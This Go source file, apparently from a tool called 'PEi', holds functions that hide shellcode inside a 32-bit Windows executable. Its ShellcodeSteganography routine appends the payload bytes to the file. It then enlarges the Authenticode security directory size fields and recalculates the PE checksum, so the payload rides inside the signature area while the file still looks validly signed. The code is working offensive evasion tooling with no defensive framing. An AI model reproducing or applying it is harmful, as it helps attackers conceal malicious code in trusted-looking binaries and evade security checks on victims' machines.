package PE

import (
	"PEi/Tools"
	"log"
)

func (x X86) WriteSecurityDirectorySizeAndPE(ShellBytesLen uint32) []byte {
	WeNeedSize := IntToBytesLittleEndian(x.GetSecurityDirectorySize() + ShellBytesLen)
	if len(WeNeedSize) != 4 {
		log.Panicf("When making changes to SecurityDirectorySize based on the size of ShellBytesLen, the Byte bits we need are not equal to 4 bits [not consistent with the expected DWORD]")
	}
	SecurityDirectoryRVA := x.GetSecurityDirectoryRVA()
	for i := 0; i < 4; i++ {
		x.FileBytes[SecurityDirectoryRVA+uint32(i)] = WeNeedSize[i]
		x.FileBytes[uint32(0x9C)+x.AddressOfNewExeHeader+uint32(i)] = WeNeedSize[i]
	}
	return x.FileBytes
}

func (x X86) WriteCheckSum() []byte {
	NewCheckSum := Tools.GeneratePECheckSum(x.FileBytes)
	WeNeedCheckSum := IntToBytesLittleEndian(NewCheckSum)
	for i := 0; i < 4; i++ {
		x.FileBytes[uint32(0x58)+x.AddressOfNewExeHeader+uint32(i)] = WeNeedCheckSum[i]
	}
	return x.FileBytes
}

func (x X86) ShellcodeSteganography(ShellBytes []byte) []byte {
	x.WriteSecurityDirectorySizeAndPE(uint32(len(ShellBytes)))
	x.FileBytes = append(x.FileBytes, ShellBytes...)
	x.WriteCheckSum()
	return x.FileBytes
}
